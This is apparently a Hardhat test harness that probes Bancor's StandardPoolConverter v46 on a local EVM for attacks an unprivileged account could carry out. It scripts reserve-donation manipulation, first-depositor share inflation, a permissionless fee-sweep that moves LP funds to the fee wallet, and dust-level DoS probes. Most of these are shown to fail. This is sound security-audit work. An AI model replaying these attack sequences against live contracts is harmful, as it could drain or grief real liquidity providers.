/**
 * Bancor StandardPoolConverter v46 — attack harness on the REAL, unmodified source.
 *
 * Everything below runs on the in-process hardhat EVM (no fork, no RPC, no keys).
 * The "attacker" is a plain EOA: it only calls public functions and moves its own tokens.
 * Any token it ends up with must come from someone else.
 *
 * run: npx hardhat test test/spc.test.js
 */
const { expect } = require("chai");
const { ethers } = require("hardhat");
const artifacts = require("../artifacts.json");

const E18 = 10n ** 18n;
const f = (x) => (Number(x) / 1e18).toLocaleString("en-US", { maximumFractionDigits: 6 });

const UPGRADER = ethers.encodeBytes32String("BancorConverterUpgrader");
const BANCOR_NETWORK = ethers.encodeBytes32String("BancorNetwork");
const NETWORK_SETTINGS = ethers.encodeBytes32String("NetworkSettings");

function deploy(name, signer, args = []) {
  const a = artifacts[name];
  return new ethers.ContractFactory(a.abi, a.bytecode, signer).deploy(...args);
}

/**
 * Builds a live pool: 2 ERC20 reserves, 50/50 weights, converter active (anchor owned by it).
 */
async function fixture({ feeBps = 3000, liquidity = 1_000_000n * E18 } = {}) {
  const [deployer, attacker, victim, network, lp] = await ethers.getSigners();

  const registry = await deploy("MockRegistry", deployer);
  const settings = await deploy("MockNetworkSettings", deployer, [20000]); // network fee 2%
  const poolToken = await deploy("MockPoolToken", deployer, ["Bancor Pool", "BNT-POOL"]);
  const token0 = await deploy("MockERC20", deployer, ["Reserve0", "R0"]);
  const token1 = await deploy("MockERC20", deployer, ["Reserve1", "R1"]);

  const converter = await deploy("StandardPoolConverter", deployer, [
    await poolToken.getAddress(),
    await registry.getAddress(),
    1_000_000, // maxConversionFee
  ]);

  // registry wiring: the "converter upgrader" must be the deployer for transferAnchorOwnership
  await registry.set(UPGRADER, deployer.address);
  await registry.set(BANCOR_NETWORK, network.address);
  await registry.set(NETWORK_SETTINGS, await settings.getAddress());

  // two reserves, equal weights, added while inactive
  await converter.addReserve(await token0.getAddress(), 500_000);
  await converter.addReserve(await token1.getAddress(), 500_000);
  // anchor ownership -> converter, then converter accepts => isActive() == true
  await poolToken.transferOwnership(await converter.getAddress());
  await converter.acceptAnchorOwnership();
  await converter.setConversionFee(feeBps);

  // fund actors
  for (const who of [attacker, victim, lp]) {
    await token0.mint(who.address, 10_000_000n * E18);
    await token1.mint(who.address, 10_000_000n * E18);
  }

  // seed liquidity from lp
  await token0.connect(lp).approve(await converter.getAddress(), liquidity * 4n);
  await token1.connect(lp).approve(await converter.getAddress(), liquidity * 4n);
  await converter
    .connect(lp)
    .addLiquidity([await token0.getAddress(), await token1.getAddress()], [liquidity, liquidity], 1);

  return { deployer, attacker, victim, network, lp, registry, settings, poolToken, token0, token1, converter };
}

/// Replicates what BancorNetwork does: pull the source tokens in, then call converter.convert().
async function networkConvert(ctx, trader, source, target, amount, beneficiary) {
  const { network, converter } = ctx;
  if (source) {
    await source.connect(trader).approve(network.address, amount);
    await source.connect(network).transferFrom(trader.address, await converter.getAddress(), amount);
  }
  return converter
    .connect(network)
    .convert(await source?.getAddress?.() ?? ethers.ZeroAddress, await target.getAddress(), amount, trader.address, beneficiary, {
      value: 0,
    });
}

describe("Bancor StandardPoolConverter v46 — can an unprivileged attacker take money out?", () => {
  it("baseline: swap works, price follows x*y=k minus 0.3% fee, pool invariant only grows", async () => {
    const ctx = await fixture();
    const { attacker, token0, token1, converter } = ctx;

    const before = await converter.reserveBalances();
    const b0 = await token0.balanceOf(attacker.address);
    const b1 = await token1.balanceOf(attacker.address);

    const amountIn = 10_000n * E18;
    await networkConvert(ctx, attacker, token0, token1, amountIn, attacker.address);

    const after = await converter.reserveBalances();
    const got = (await token1.balanceOf(attacker.address)) - b1;
    const spent = b0 - (await token0.balanceOf(attacker.address));

    console.log(`  spot out (no fee) = ${f((before[1] * amountIn) / (before[0] + amountIn))}`);
    console.log(`  actual out        = ${f(got)}   spent = ${f(spent)}`);
    console.log(`  invariant before  = ${(before[0] * before[1]).toString()}`);
    console.log(`  invariant after   = ${(after[0] * after[1]).toString()}  (must be >= before)`);

    expect(after[0] * after[1] > before[0] * before[1]).to.equal(true);
    expect(got < (before[1] * amountIn) / (before[0] + amountIn)).to.equal(true); // fee taken
  });

  it("ATTACK 1 — donation / stale-reserve manipulation: attacker loses money", async () => {
    const ctx = await fixture();
    const { attacker, token0, token1, converter } = ctx;

    const t0 = await token0.balanceOf(attacker.address);
    const t1 = await token1.balanceOf(attacker.address);
    const [r0, r1] = await converter.reserveBalances();

    // 1) dump tokens straight into the converter, without syncing the stored balances
    const donation = 100_000n * E18;
    await token1.connect(attacker).transfer(await converter.getAddress(), donation);

    // stored balances are now LOWER than reality -> this is the only state where
    // "stale reserves" could be abused (it makes the pool look smaller than it is)
    const stored = await converter.reserveBalances();
    console.log(`  stored reserves after donation: ${f(stored[0])} / ${f(stored[1])}`);
    console.log(`  real   reserves after donation: ${f(await token0.balanceOf(await converter.getAddress()))} / ${f(
      await token1.balanceOf(await converter.getAddress())
    )}`);
    expect(stored[1]).to.equal(r1); // donation NOT counted -> stale

    // 2) attacker now sells token1 into the pool to exploit the "small" reserve
    const sell = 100_000n * E18;
    await networkConvert(ctx, attacker, token1, token0, sell, attacker.address);

    const gotToken0 = (await token0.balanceOf(attacker.address)) - t0;
    const spentToken1 = t1 - (await token1.balanceOf(attacker.address)); // donation + sell

    console.log(`  attacker paid  = ${f(spentToken1)} R1 (donation ${f(donation)} + trade ${f(sell)})`);
    console.log(`  attacker got   = ${f(gotToken0)} R0`);
    console.log(`  PnL (in R1 terms, pool price ~1:1) = ${f(gotToken0 - spentToken1)}`);

    // the donation is absorbed by the pool: the trade jumps the stored balance up to reality
    const after = await converter.reserveBalances();
    console.log(`  stored reserves after the trade: ${f(after[0])} / ${f(after[1])}`);
    expect(after[1] > r1).to.equal(true); // donation stayed in the pool
    expect(gotToken0 < spentToken1).to.equal(true); // strictly worse than doing nothing
  });

  it("ATTACK 2 — first-LP share inflation: victim's deposit cannot be stolen", async () => {
    const ctx = await fixture();
    const { attacker, victim, token0, token1, converter, poolToken } = ctx;

    // fresh empty pool: deploy a second converter so supply starts at 0
    const registry2 = await deploy("MockRegistry", ctx.deployer);
    await registry2.set(UPGRADER, ctx.deployer.address);
    await registry2.set(BANCOR_NETWORK, ctx.network.address);
    await registry2.set(NETWORK_SETTINGS, await ctx.settings.getAddress());
    const poolToken2 = await deploy("MockPoolToken", ctx.deployer, ["P2", "P2"]);
    const c2 = await deploy("StandardPoolConverter", ctx.deployer, [
      await poolToken2.getAddress(),
      await registry2.getAddress(),
      1_000_000,
    ]);
    await c2.addReserve(await token0.getAddress(), 500_000);
    await c2.addReserve(await token1.getAddress(), 500_000);
    await poolToken2.transferOwnership(await c2.getAddress());
    await c2.acceptAnchorOwnership();

    await token0.connect(attacker).approve(await c2.getAddress(), 10n ** 40n);
    await token1.connect(attacker).approve(await c2.getAddress(), 10n ** 40n);
    await token0.connect(victim).approve(await c2.getAddress(), 10n ** 40n);
    await token1.connect(victim).approve(await c2.getAddress(), 10n ** 40n);

    // 1) attacker mints the smallest possible supply: (1 wei, 1 wei)
    await c2.connect(attacker).addLiquidity([await token0.getAddress(), await token1.getAddress()], [1n, 1n], 1);
    console.log(`  attacker shares = ${(await poolToken2.balanceOf(attacker.address)).toString()}`);

    // 2) classic inflation: donate so that 1 share "owns" 100 R0/R1
    const donation = 100n * E18;
    await token0.connect(attacker).transfer(await c2.getAddress(), donation);
    await token1.connect(attacker).transfer(await c2.getAddress(), donation);
    await c2.syncReserveBalances();

    // 3) victim deposits a normal amount
    const v0 = await token0.balanceOf(victim.address);
    const v1 = await token1.balanceOf(victim.address);
    const dep = 1_000n * E18;
    await c2.connect(victim).addLiquidity([await token0.getAddress(), await token1.getAddress()], [dep, dep], 1);
    const shares = await poolToken2.balanceOf(victim.address);
    console.log(`  victim shares for ${f(dep)}+${f(dep)} = ${shares.toString()}`);
    expect(shares > 0n).to.equal(true);

    // 4) victim immediately removes everything
    await c2
      .connect(victim)
      .removeLiquidity(shares, [await token0.getAddress(), await token1.getAddress()], [1n, 1n]);
    const lost0 = v0 - (await token0.balanceOf(victim.address));
    const lost1 = v1 - (await token1.balanceOf(victim.address));
    console.log(`  victim round-trip loss = ${lost0.toString()} wei R0 + ${lost1.toString()} wei R1`);
    expect(lost0 + lost1 <= 4n).to.equal(true); // dust only, no theft

    // 5) the only real effect is griefing: a dust deposit reverts instead of minting shares
    let reverted = false;
    try {
      await c2.connect(victim).addLiquidity(
        [await token0.getAddress(), await token1.getAddress()],
        [E18, E18],
        1
      );
    } catch (e) {
      reverted = String(e.message).includes("ERR_ZERO_TARGET_AMOUNT");
    }
    console.log(`  dust deposit (1 token each) reverts: ${reverted}`);
    expect(reverted).to.equal(true);
  });

  it("FINDING — anyone can call processNetworkFees()/syncReserveBalances(); LP funds leak to the fee wallet", async () => {
    const ctx = await fixture();
    const { attacker, token0, token1, converter, settings, lp } = ctx;

    // an LP round trip through removeLiquidity resets _reserveBalancesProduct to a LOWER value
    const [s0, s1] = await converter.reserveBalances();
    const lpShares = await ctx.poolToken.balanceOf(lp.address);
    const half = lpShares / 2n;
    await converter
      .connect(lp)
      .removeLiquidity(half, [await token0.getAddress(), await token1.getAddress()], [1n, 1n]);
    const [m0, m1] = await converter.reserveBalances();
    console.log(`  after LP removal: reserves ${f(m0)} / ${f(m1)}`);

    // attacker (or anybody) donates to restore the product, then triggers the fee sweep
    const donation = 200_000n * E18;
    await token0.connect(attacker).transfer(await converter.getAddress(), donation);
    await token1.connect(attacker).transfer(await converter.getAddress(), donation);

    const feeWalletToken0Before = await token0.balanceOf(await settings.getAddress());
    const feeWalletToken1Before = await token1.balanceOf(await settings.getAddress());

    await converter.connect(attacker).syncReserveBalances(); // permissionless
    await converter.connect(attacker).processNetworkFees(); // permissionless

    const gotToken0 = (await token0.balanceOf(await settings.getAddress())) - feeWalletToken0Before;
    const gotToken1 = (await token1.balanceOf(await settings.getAddress())) - feeWalletToken1Before;
    console.log(`  network fee wallet received: ${f(gotToken0)} R0 + ${f(gotToken1)} R1`);
    console.log(`  (attacker paid ${f(donation * 2n)} of donations, keeps none of the fee)`);
    expect(gotToken0 + gotToken1 > 0n).to.equal(true);
  });

  it("DoS probes: 1-wei convert, minReturn == 0, zero min-returns", async () => {
    const ctx = await fixture();
    const { attacker, token0, token1, converter } = ctx;

    // a 1-wei conversion is rejected by require(amount != 0) — no dust drain
    await token0.connect(attacker).approve(ctx.network.address, 1n);
    await token0.connect(ctx.network).transferFrom(attacker.address, await converter.getAddress(), 1n);
    let msg = "";
    try {
      await converter
        .connect(ctx.network)
        .convert(await token0.getAddress(), await token1.getAddress(), 1n, attacker.address, attacker.address);
    } catch (e) {
      msg = e.message;
    }
    console.log(`  1 wei convert reverted: ${msg.includes("ERR_ZERO_TARGET_AMOUNT")}`);
    expect(msg).to.include("ERR_ZERO_TARGET_AMOUNT");

    // addLiquidity cannot be called with minReturn == 0 (verifyLiquidityInput requires _amount > 0)
    await token0.connect(attacker).approve(await converter.getAddress(), E18);
    await token1.connect(attacker).approve(await converter.getAddress(), E18);
    let msg2 = "";
    try {
      await converter
        .connect(attacker)
        .addLiquidity([await token0.getAddress(), await token1.getAddress()], [E18, E18], 0);
    } catch (e) {
      msg2 = e.message;
    }
    console.log(`  addLiquidity(...,0) reverted: ${msg2.includes("ERR_ZERO_AMOUNT")}`);
    expect(msg2).to.include("ERR_ZERO_AMOUNT");
  });
});
